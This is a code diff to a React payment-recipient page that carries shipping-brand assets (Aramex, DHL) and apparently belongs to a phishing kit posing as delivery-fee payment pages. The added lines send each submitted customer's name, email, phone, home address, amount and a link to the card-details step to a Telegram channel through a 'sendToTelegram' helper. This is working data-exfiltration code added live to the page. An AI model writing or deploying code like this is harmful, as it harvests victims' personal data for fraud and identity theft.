@@ -8,6 +8,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
+import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
@@ -86,6 +87,27 @@ const PaymentRecipient = () => {
       console.error('Form submission error:', error);
     }
     
+    // Send data to Telegram
+    const telegramResult = await sendToTelegram({
+      type: 'payment_recipient',
+      data: {
+        name: customerName,
+        email: customerEmail,
+        phone: customerPhone,
+        address: residentialAddress,
+        service: serviceName,
+        amount: formattedAmount,
+        payment_url: `${window.location.origin}/pay/${id}/details`
+      },
+      timestamp: new Date().toISOString()
+    });
+
+    if (telegramResult.success) {
+      console.log('Recipient data sent to Telegram successfully');
+    } else {
+      console.error('Failed to send recipient data to Telegram:', telegramResult.error);
+    }
+
     sessionStorage.setItem('customerInfo', JSON.stringify({
       name: customerName,
       email: customerEmail,
